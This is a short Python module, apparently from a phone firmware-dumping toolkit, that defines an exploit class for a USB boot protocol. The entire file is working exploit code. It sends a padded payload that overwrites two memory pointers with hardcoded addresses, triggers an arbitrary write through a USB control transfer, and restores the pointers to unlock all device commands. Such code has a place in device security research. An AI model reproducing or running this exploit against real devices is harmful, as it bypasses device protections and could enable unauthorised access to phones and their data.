import struct

from dump.pipl_protocol import PiplProtocol


class PiplExploit(PiplProtocol):

    def execute(self, dev, output):
        super().execute(dev, output)

        # overwrite two pointers: pointer to setup's EP (must point to a zero byte), pointer to setup buffer contents (used for arb write)
        data = self.comm(0x20, variable_payload=b"\x00" * (0x8098-1) + struct.pack("<II", 0x81162ab4, 0x811402c2-8))
        try:
            # trigger write to controlled ptr
            self.dev.ctrl_transfer(0x80, 0x06, 0x0200, 0x00, 0x100)
        except Exception:
            pass

        # restore original contents
        self.comm_oneway(0x20, variable_payload=b"\x00" * (0x8098-1) + struct.pack("<II", 0x81162ab4, 0x81162a5c))

        # at this point all commands should be unlocked
        print("!! Restart the phone before running another payload !!")
